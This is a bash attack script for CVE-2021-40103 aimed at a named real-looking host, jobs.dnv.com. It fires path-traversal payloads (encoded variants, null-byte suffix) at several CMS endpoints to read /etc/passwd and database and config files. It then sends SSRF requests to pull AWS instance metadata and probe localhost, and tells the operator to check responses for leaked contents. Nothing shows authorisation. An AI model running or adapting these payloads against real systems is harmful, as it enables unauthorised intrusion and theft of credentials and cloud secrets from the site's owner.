#!/bin/bash
# CVE-2021-40103: Path Traversal to Arbitrary File Reading and SSRF
# Severity: Medium
# Affected: < 8.5.6

echo "=== CVE-2021-40103: Path Traversal to Arbitrary File Reading and SSRF ==="

# Common endpoints that might be vulnerable to path traversal
ENDPOINTS=(
    "/index.php/tools/required/files/importers/remote"
    "/index.php/ccm/system/file/upload"
    "/index.php/ccm/system/dialogs/file/upload_complete"
    "/index.php/download_file/view"
    "/index.php/download_file/view_inline"
)

# Path traversal payloads
PAYLOADS=(
    "../../../../etc/passwd"
    "....//....//....//....//etc/passwd"
    "..%2f..%2f..%2f..%2fetc%2fpasswd"
    "../../../../application/config/database.php"
    "../../../../concrete/config/concrete.php"
)

echo -e "\n[1] Testing path traversal on various endpoints..."
for endpoint in "${ENDPOINTS[@]}"; do
    echo -e "\n--- Testing: $endpoint ---"
    for payload in "${PAYLOADS[@]}"; do
        echo "Payload: $payload"
        curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}bytes\n" \
            "https://jobs.dnv.com${endpoint}?file=${payload}%00"
    done
done

# Test file inclusion via remote URL (SSRF)
echo -e "\n[2] Testing SSRF via remote file import..."
curl -s "https://jobs.dnv.com/index.php/tools/required/files/importers/remote%00" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "url=http://169.254.169.254/latest/meta-data/" \
    -v

# Test internal network SSRF
echo -e "\n[3] Testing internal network SSRF..."
curl -s "https://jobs.dnv.com/index.php/tools/required/files/importers/remote%00" \
    -X POST \
    -d "url=http://localhost:80" \
    -v

echo -e "\n[*] Check responses for:"
echo "    - Leaked file contents (database.php, passwd, etc.)"
echo "    - AWS metadata responses"
echo "    - Internal service responses"
